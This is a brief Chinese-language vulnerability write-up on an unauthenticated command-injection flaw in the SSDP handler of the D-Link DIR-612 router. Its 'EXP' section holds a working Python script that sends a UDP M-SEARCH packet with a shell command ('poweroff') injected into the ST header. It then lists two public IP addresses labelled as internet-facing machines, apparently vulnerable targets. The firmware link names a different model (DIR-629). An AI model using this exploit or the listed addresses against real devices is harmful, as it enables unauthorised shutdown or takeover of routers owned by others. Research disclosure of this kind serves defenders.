# DIR-612

**产品型号**: D-Link DIR-612（硬件版本A1）

**固件版本**: 1.10 B05

**厂家官网**: http://www.dlink.com.cn/

**固件地址**: http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-629

![image-20210317223351729](https://gitee.com/mrskye/Picbed/raw/master/img/20210317223358.png)

## 漏洞信息

漏洞二进制文件：`/htdocs/cgibin`

漏洞函数：`ssdpcgi_main` 

在处理 /ssdpcgi 时，SERVER_ID 的值用于拼接 `%s services %s:%s %s %s &` ，该字符串随后被传入 lxmldbc_system 进行系统调用。由于没有对 SERVER_ID 进行过滤，因此存在注入命令，实现 rce 。

![image-20210317223754651](https://gitee.com/mrskye/Picbed/raw/master/img/20210317223754.png)

## EXP

这个接口是 socket 服务，不能通过 web 访问

```python
import sys
import os
import socket
from time import sleep

ip = "192.168.0.1"
port = 1900
command = "poweroff"

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)

payload = "M-SEARCH * HTTP/1.1\n"
payload += "HOST:"+str(ip)+":"+str(port)+"\n"
payload += "ST:urn:device:1;{}\n".format(command)
payload += "MX:2\n"
payload += 'MAN:"ssdp:discover"'+"\n\n"

sock.sendto(payload,(ip, port))
```

> 公网机器：
>
> http://122.225.206.91:8333/
>
> http://112.118.247.147:8080/

## 参考资料

https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73

https://xz.aliyun.com/t/5468#toc-2

https://www.anquanke.com/post/id/94289